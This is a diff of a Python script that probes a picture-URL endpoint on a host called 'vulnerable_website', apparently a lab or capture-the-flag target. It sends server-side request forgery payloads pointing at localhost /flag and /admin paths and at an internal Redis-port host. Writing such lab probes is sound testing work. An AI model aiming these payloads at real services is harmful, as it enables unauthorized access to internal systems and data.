@@ -42,7 +42,7 @@ base_url = "http://vulnerable_website:5000/test_picture_url"
 auth = HTTPBasicAuth(username, password)
 
 payload = {
-    "url": "https://ifconfig.me"  # "malicious" payload
+    "url": "http://127.0.0.1:5000/flag"  # valid url
 }
 
 try:
@@ -52,3 +52,28 @@ try:
     print(response.text)
 except requests.exceptions.RequestException as e:
     print("An error occurred:", e)
+
+payload = {
+    "url": "http://127.0.0.1:5000/admin"  # invalid url
+}
+
+try:
+    response = requests.post(base_url, json=payload, auth = auth)
+    print("Status Code:", response.status_code)
+    print("Response:")
+    print(response.text)
+except requests.exceptions.RequestException as e:
+    print("An error occurred:", e)
+
+payload = {
+    "url": "bla.db.internal:6379:1324/?q=nice"  # error
+}
+
+try:
+    response = requests.post(base_url, json=payload, auth = auth)
+    print("Status Code:", response.status_code)
+    print("Response:")
+    print(response.text)
+except requests.exceptions.RequestException as e:
+    print("An error occurred:", e)
+
